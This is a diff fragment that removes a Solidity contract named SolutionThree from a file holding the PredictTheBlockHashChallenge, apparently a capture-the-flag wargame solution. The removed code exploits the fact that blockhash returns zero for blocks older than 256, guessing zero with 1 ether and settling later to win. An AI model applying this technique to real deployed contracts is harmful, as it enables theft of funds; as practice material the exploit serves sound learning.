@@ -36,25 +36,3 @@ contract PredictTheBlockHashChallenge {
         }
     }
 }
-
-contract SolutionThree{
-
-    bytes32 public blockNumber;
-    PredictTheBlockHashChallenge public victim;
-    function SolutionThree(PredictTheBlockHashChallenge _victim) public payable{
-        victim = _victim;
-    }
-
-    //ex: call lockGuess() in block 1
-    function lockGuess() public payable{
-        victim.lockInGuess.value(1 ether)(bytes32(0));
-    }
-
-    //ex: call settle() in block 4, will pass the test.
-    function settle() public{
-        victim.settle();
-        require(victim.isComplete());
-    }
-
-    function() public payable{}
-}
